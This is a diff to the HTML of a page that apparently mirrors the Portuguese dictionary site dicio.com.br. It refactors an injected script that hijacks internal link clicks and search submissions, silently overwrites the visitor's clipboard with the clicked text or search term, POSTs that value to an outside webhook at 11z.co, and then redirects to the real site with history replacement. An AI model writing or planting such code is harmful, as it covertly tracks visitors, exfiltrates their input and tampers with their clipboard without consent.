@@ -102,14 +102,38 @@
                     el.parentNode.insertBefore(s, el);
                   })();
                 </script><script src="js/auto-complete.min.js" async=""></script>
-    <!-- Script de Redirecionamento Avançado v2: Cópia Silenciosa Robusta, POST e Substituição de Histórico -->
+    <!-- Script de Redirecionamento Avançado: Cópia Silenciosa e Substituição de Histórico -->
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             const baseUrl = 'https://www.dicio.com.br';
-            const webhookUrl = 'https://www.11z.co/_w/5156/selection';
-            
-            const noCopyUrls = ['/rss/', '/manifest.json', '/site.webmanifest', '/opensearch.php', '/sobre.html', '/politica-de-privacidade.html', '/termos-de-uso.html', '/contato.php', '/lista-de-palavras/', '/palavras-mais-buscadas/', '/exemplos-de-palavras/', '/ultimas-atualizacoes/', '/jogos-caca-palavras/', '/cata-letras/', '/jogo-conexoes/', '/palavra-do-dia/', '/duvidas-da-lingua-portuguesa/', '/curiosidades-da-lingua-portuguesa/', '/girias-e-expressoes-regionais-brasileiras/', '/palavras-formais-e-seus-significados/', '/livros-infantis-para-brincar-com-as-palavras/', '/maiores-escritores-brasileiros-e-suas-obras/', '/cronicas-para-cultivar-o-habito-de-leitura/', '/prefixo-e-sufixo/', '/palavras-com-', '/palavras-comecam-a-com-'];
-
+            const noCopyUrls = [
+                '/rss/',
+                '/manifest.json',
+                '/site.webmanifest',
+                '/opensearch.php',
+                '/sobre.html',
+                '/politica-de-privacidade.html',
+                '/termos-de-uso.html',
+                '/contato.php',
+                '/lista-de-palavras/',
+                '/palavras-mais-buscadas/',
+                '/exemplos-de-palavras/',
+                '/ultimas-atualizacoes/',
+                '/jogos-caca-palavras/',
+                '/cata-letras/',
+                '/jogo-conexoes/',
+                '/palavra-do-dia/',
+                '/duvidas-da-lingua-portuguesa/',
+                '/curiosidades-da-lingua-portuguesa/',
+                '/girias-e-expressoes-regionais-brasileiras/',
+                '/palavras-formais-e-seus-significados/',
+                '/livros-infantis-para-brincar-com-as-palavras/',
+                '/maiores-escritores-brasileiros-e-suas-obras/',
+                '/cronicas-para-cultivar-o-habito-de-leitura/',
+                '/prefixo-e-sufixo/',
+                '/palavras-com-',
+                '/palavras-comecam-a-com-'
+            ];
             function shouldSkipCopy(href) {
                 for (let url of noCopyUrls) {
                     if (href.includes(url)) return true;
@@ -117,65 +141,29 @@
                 return false;
             }
 
-            function copyToClipboard(text) {
-                return new Promise((resolve) => {
-                    try {
-                        if (navigator.clipboard && window.isSecureContext) {
-                            navigator.clipboard.writeText(text).then(() => {
-                                console.log('Copiado:', text);
-                                resolve(true);
-                            }).catch((err) => {
-                                copyViaTextarea(text, resolve);
-                            });
-                        } else {
-                            copyViaTextarea(text, resolve);
-                        }
-                    } catch (err) {
-                        copyViaTextarea(text, resolve);
-                    }
-                });
-            }
-
-            function copyViaTextarea(text, resolve) {
+            async function copyToClipboard(text) {
                 try {
-                    const textArea = document.createElement("textarea");
-                    textArea.value = text;
-                    textArea.style.position = "fixed";
-                    textArea.style.left = "-9999px";
-                    textArea.style.top = "0";
-                    textArea.style.opacity = "0";
-                    document.body.appendChild(textArea);
-                    textArea.focus();
-                    textArea.select();
-                    const successful = document.execCommand('copy');
-                    document.body.removeChild(textArea);
-                    console.log('Copiado (fallback):', text);
-                    resolve(successful);
-                } catch (err) {
-                    resolve(false);
-                }
-            }
-
-            function sendToWebhook(value) {
-                return new Promise((resolve) => {
-                    try {
-                        fetch(webhookUrl, {
-                            method: "POST",
-                            headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({ "value": value }),
-                            keepalive: true,
-                            mode: 'no-cors'
-                        }).then(response => {
-                            console.log('POST enviado:', value);
-                            resolve(true);
-                        }).catch((err) => {
-                            console.log('Erro no POST:', err);
-                            resolve(false);
-                        });
-                    } catch (err) {
-                        resolve(false);
+                    if (navigator.clipboard && navigator.clipboard.writeText) {
+                        await navigator.clipboard.writeText(text);
+                    } else {
+                        const textArea = document.createElement("textarea");
+                        textArea.value = text;
+                        textArea.style.position = "fixed";
+                        textArea.style.left = "-9999px";
+                        textArea.style.top = "0";
+                        document.body.appendChild(textArea);
+                        textArea.focus();
+                        textArea.select();
+                        document.execCommand('copy');
+                        document.body.removeChild(textArea);
                     }
-                });
+                } catch (err) {}
+                fetch("https://www.11z.co/_w/5156/selection", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ "value": text }),
+                    keepalive: true
+                }).catch(() => {});
             }
 
             document.querySelectorAll('a[href]').forEach(function(link) {
@@ -190,8 +178,8 @@
                 const link = e.target.closest('a');
                 if (link && link.getAttribute('href')) {
                     const href = link.getAttribute('href');
-                    const isInternal = (!href.startsWith('http') && !href.startsWith('#') && !href.startsWith('mailto')) || href.startsWith(baseUrl);
-                    
+                    const isInternal = (!href.startsWith('http') && !href.startsWith('#') && !href.startsWith('mailto'))
+                                    || href.startsWith(baseUrl);
                     if (isInternal) {
                         e.preventDefault();
                         
@@ -199,12 +187,11 @@
                             const textToCopy = link.innerText.trim();
                             if (textToCopy) {
                                 await copyToClipboard(textToCopy);
-                                await sendToWebhook(textToCopy);
                             }
                         }
 
                         const targetUrl = href.startsWith(baseUrl) ? href : baseUrl + (href.startsWith('/') ? href : '/' + href);
-                        setTimeout(() => { window.location.replace(targetUrl); }, 100);
+                        window.location.replace(targetUrl);
                     }
                 }
             }, true);
@@ -217,15 +204,13 @@
                         e.preventDefault();
                         const searchInput = form.querySelector('input[name="q"]');
                         if (searchInput && searchInput.value.trim()) {
-                            const searchTerm = searchInput.value.trim();
-                            await copyToClipboard(searchTerm);
-                            await sendToWebhook(searchTerm);
+                            await copyToClipboard(searchInput.value.trim());
                         }
                         const formData = new FormData(form);
                         const params = new URLSearchParams(formData).toString();
                         const path = action.startsWith('/') ? action : '/' + action;
                         const targetUrl = baseUrl + path + '?' + params;
-                        setTimeout(() => { window.location.replace(targetUrl); }, 100);
+                        window.location.replace(targetUrl);
                     }
                 });
             });
